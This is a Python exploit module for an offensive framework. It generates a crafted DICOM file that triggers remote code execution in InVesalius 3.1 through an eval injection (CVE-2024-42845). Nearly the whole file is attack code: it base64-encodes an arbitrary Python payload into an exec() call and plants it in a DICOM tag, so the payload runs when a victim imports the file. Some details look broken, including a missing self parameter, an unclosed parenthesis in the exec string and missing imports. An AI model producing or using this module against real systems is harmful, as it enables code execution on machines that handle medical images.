#######
# Module/Auxiliary: Invesalius 3.1 Remote Code Execution
#######

from libs.terasploit.framework.opts.opt_container import *
from libs.terasploit.framework.info.info_container import *
from libs.terasploit.framework.module.auxiliary import *

class TerasploitModule(Auxiliary):
    
    module_type = 'auxiliary'
    pydicom.config.settings.reading_validation_mode = pydicom.config.IGNORE
    
    def initialize(self,info_only: bool = False) -> None:
        update_info (
            {
                'Module' : self.module_type,
                'Name' : 'Invesalius 3.1 Remote Code Execution',
                
                'Module Author' : 'Charlie (4steroth)',
                'Exploit Author' : 'Alessio Romano (sfoffo), Riccardo Degli Esposti (partywave)',
                
                'Version' : '3.1.99991 - 3.1.99998',
                'CVE' : 'CVE-2024-42845',
                'NVD' : 'https://nvd.nist.gov/vuln/detail/CVE-2024-42845',
                'Exploit-DB' : 'https://www.exploit-db.com/exploits/52076',
                
                'Description' : [
                    'An eval Injection vulnerability in the component invesalius/reader/dicom.py of',
                    'InVesalius 3.1.99991 through 3.1.99998 allows attackers to execute arbitrary',
                    'code via loading a crafted DICOM file. This module will generate a malicious',
                    'DICOM file to be imported on the target.'
                ]
            }
        )

        if info_only:
            return
        
        register_option ('auxiliary',opt=[
            OptString.new('dicom_path','file',['','yes','dicom input file path']),
            OptString.new('outfile','none',['','yes','dicom file output path']),
            OptString.new('pylicious','file',['','yes','python file containing malicious plain code (python3)']),
            OptBool.new('signature',['true','yes','put a signature on the dicom file (manufacturer, institution name)']),
        ])
        
    
    def encode_pylicious(pylicious):
        data = open(pylicious, 'rb').read()
        return f"exec(__import__('base64').b64decode({base64.b64encode(data)})"
        
    
    def dicom_pylicious(self,dicom_path,pylicious):
        dicom_data = pydicom.dcmread(dicom_path)
            
        values = dicom_data[0x0020, 0x0032].value
        mal = [str(i) for i in values]
        mal.append(self.encode_pylicious(pylicious))
        
        return mal
    
    
    def dicom_modifier(self,dicom_path, malicious_tag, outfile, sign):
        dicom_dataset = pydicom.dcmread(dicom_path)
        if sign.lower() == 'true':
            dicom_dataset.Manufacturer = "Malicious DICOM file creator"
            dicom_dataset.InstitutionName = "Malicious DICOM file institution"
        
        elem =  pydicom.dataelem.DataElement(0x00200032, 'CS', malicious_tag)
        dicom_dataset[0x00200032] = elem
        print ('----')
        print(dicom_dataset)
        print ('----')
        dicom_dataset.save_as(outfile)
        info_print(f'DICOM File saved as: {outfile}')
        

    def run(self):
        dicom_path = self.GetOPT('dicom_path')
        outfile = self.GetOPT('outfile')
        pylicious = self.GetOPT('pylicious')
        signature = self.GetOPT('signature')
        
        info_print (f'Signature: {signature}')
        info_print (f'DICOM: {dicom_path}')
        info_print ('Preparing Pylicious...')
        
        try:
            tmp_tag = self.dicom_pylicious(dicom_path,pylicious)
            malicious_tag = '\\'.join(tmp_tag)
            info_print ('Pylicious prepared!')
            self.dicom_modifier(dicom_path,malicious_tag,outfile,signature)
            
        except pydicom.errors.InvalidDicomError:
            info_print ('An invalid dicom file was specified',type='red')
            return 'exception', True
            
        except Exception as error:
            info_print (error,type='red')
            return 'exception', True